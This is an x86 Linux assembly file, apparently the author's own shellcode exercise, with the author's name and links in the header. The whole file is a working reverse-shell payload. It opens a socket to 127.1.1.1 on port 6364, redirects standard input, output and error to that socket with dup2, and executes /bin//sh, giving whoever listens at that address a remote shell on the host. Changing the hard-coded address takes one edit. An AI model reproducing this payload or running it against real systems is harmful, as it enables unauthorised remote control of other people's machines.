;Charles Dardaman
;https://charles.dardaman.com
;@charlesdardaman

global _start

section .text
_start:
    ;make socket
    mov al, 0x66 ;syscall for socketcall
    xor ebx, ebx ;clears ebx
    push ebx ;push 0
    inc ebx
    push ebx ;push 1
    push 0x2
    mov ecx, esp ; pointer to the arguments
    int 0x80
    
    ;save the socket
    mov edi, eax

    ;connect
    push 0x0101017f ;IP 127.1.1.1
    push word 0xDC18 ; port 6364
    push word 0x2 
    mov ecx, esp
    push 0x10 ; size
    push ecx
    push edi ;socket
    mov al, 0x66
    mov bl, 0x3
    mov ecx, esp
    int 0x80 

    ;inputs
    mov ebx, edi
    xor ecx, ecx

looper:
    mov al, 0x3f ;call to dup2
    int 0x80
    inc ecx
    cmp ecx, 0x4 ;loop 3 times
    jne looper

    ;execute sh
    xor edx,edx
    push edx
    push 0x68732f6e ;hs/n
    push 0x69622f2f ;ib//
    mov ebx, esp
    mov ecx, edx
    mov al, 0xb ;call to execve 
    int 0x80